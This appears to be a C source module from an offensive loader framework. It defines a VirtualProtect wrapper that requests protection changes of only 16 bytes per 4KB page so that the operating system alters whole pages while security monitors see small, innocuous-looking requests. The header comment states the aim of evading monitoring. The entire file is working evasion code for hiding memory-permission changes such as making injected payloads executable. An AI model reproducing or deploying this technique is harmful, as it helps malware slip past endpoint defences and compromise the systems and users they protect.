/* MODULE: VIRTUALPROTECT
 * TYPE: undersized
 * DESC: Calls VirtualProtect in 4KB chunks but requests smaller size to evade monitors.
 */
#include "../header/definitions.h"

#define VP_SIZE 16

BOOL MyVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    char *dest = (char *)lpAddress;

    // Loop through memory pages (4096 bytes)
    for(int n=0; n<(dwSize/4096)+1; n++) {
        // Request change for only VP_SIZE (16 bytes)
        // OS is forced to change the whole page
        if (VirtualProtect(dest + (n * 4096), VP_SIZE, flNewProtect, lpflOldProtect) == 0) {
            return FALSE;
        }
    }
    return TRUE;
}
